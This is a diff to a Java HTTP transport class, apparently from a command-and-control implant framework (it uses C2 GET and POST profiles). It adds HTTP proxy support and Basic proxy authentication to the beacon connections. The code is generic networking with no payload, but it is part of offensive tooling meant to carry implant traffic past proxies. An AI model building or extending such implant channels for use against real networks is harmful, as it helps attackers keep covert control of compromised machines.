@@ -15,7 +15,9 @@ import java.io.DataOutputStream;
 import java.io.EOFException;
 import java.io.IOException;
 import java.io.OutputStream;
+import java.net.InetSocketAddress;
 import java.net.MalformedURLException;
+import java.net.Proxy;
 import java.net.URL;
 import java.net.URLConnection;
 
@@ -117,6 +119,10 @@ public class HttpTransport extends Transport {
 
     public String getCustomHeaders() {
         return this.customHeaders;
+    }
+
+    public void setCustomHeaders(String customHeaders) {
+        this.customHeaders = customHeaders;
     }
 
     public C2VerbConfig getC2Get() {
@@ -362,12 +368,54 @@ public class HttpTransport extends Transport {
         }
     }
 
+    private Proxy buildProxy() {
+        if (proxyUrl == null || proxyUrl.length() == 0) {
+            return null;
+        }
+        try {
+            URL p = new URL(proxyUrl);
+            int port = p.getPort();
+            if (port < 0) {
+                port = "https".equals(p.getProtocol()) ? 443 : 80;
+            }
+            return new Proxy(Proxy.Type.HTTP, new InetSocketAddress(p.getHost(), port));
+        }
+        catch (MalformedURLException ex) {
+            return null;
+        }
+    }
+
+    private void applyProxyAuth(URLConnection conn) {
+        if (proxyUser == null || proxyUser.length() == 0) {
+            return;
+        }
+        String pass = (proxyPass != null) ? proxyPass : "";
+        byte[] creds;
+        try {
+            creds = (proxyUser + ":" + pass).getBytes("US-ASCII");
+        } catch (java.io.UnsupportedEncodingException ex) {
+            creds = (proxyUser + ":" + pass).getBytes();
+        }
+        byte[] encoded = base64Encode(creds, B64_CHARS, true);
+        try {
+            conn.setRequestProperty("Proxy-Authorization", "Basic " + new String(encoded, "US-ASCII"));
+        } catch (java.io.UnsupportedEncodingException ex) {
+            conn.setRequestProperty("Proxy-Authorization", "Basic " + new String(encoded));
+        }
+    }
+
+    private URLConnection openConnection(URL url) throws IOException {
+        Proxy proxy = buildProxy();
+        return (proxy != null) ? url.openConnection(proxy) : url.openConnection();
+    }
+
     private URLConnection createGetConnection() {
         try {
             URL url = buildProfileUrl(this.c2Get);
-            URLConnection conn = url.openConnection();
+            URLConnection conn = openConnection(url);
             HttpConnection.addRequestHeaders(conn, customHeaders, userAgent);
             applyProfileHeaders(conn, this.c2Get);
+            applyProxyAuth(conn);
 
             if (url.getProtocol().equals("https")) {
                 try {
@@ -385,9 +433,10 @@ public class HttpTransport extends Transport {
     private URLConnection createPostConnection() {
         try {
             URL url = buildProfileUrl(this.c2Post);
-            URLConnection conn = url.openConnection();
+            URLConnection conn = openConnection(url);
             HttpConnection.addRequestHeaders(conn, customHeaders, userAgent);
             applyProfileHeaders(conn, this.c2Post);
+            applyProxyAuth(conn);
 
             if (url.getProtocol().equals("https")) {
                 try {
